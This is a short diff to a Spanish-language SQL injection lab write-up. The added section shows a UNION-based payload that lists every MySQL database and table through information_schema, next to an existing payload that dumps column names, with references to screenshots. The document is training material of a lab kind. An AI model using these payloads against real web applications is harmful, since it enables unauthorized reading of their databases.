@@ -70,3 +70,12 @@ Inyección →
 999' UNION select null, concat(information_Schema.tables.table_schema,'-->',information_Schema.columns.table_name), information_Schema.columns.column_name FROM information_Schema.columns, information_Schema.tables WHERE information_Schema.tables.table_name = information_Schema.columns.table_name;#
 ```
 ![](capturas/sql-injection-lab1-6.png)
+
+
+# Todas las bases de datos y sus tablas de MySQL
+Inyección SQL →
+```
+999' UNION select null, table_schema,table_name FROM information_Schema.tables;#
+```
+Obtenemos resultados del nombre de la base de datos con la información de sus columnas→
+![](capturas/sql-injection-lab1-7.png)
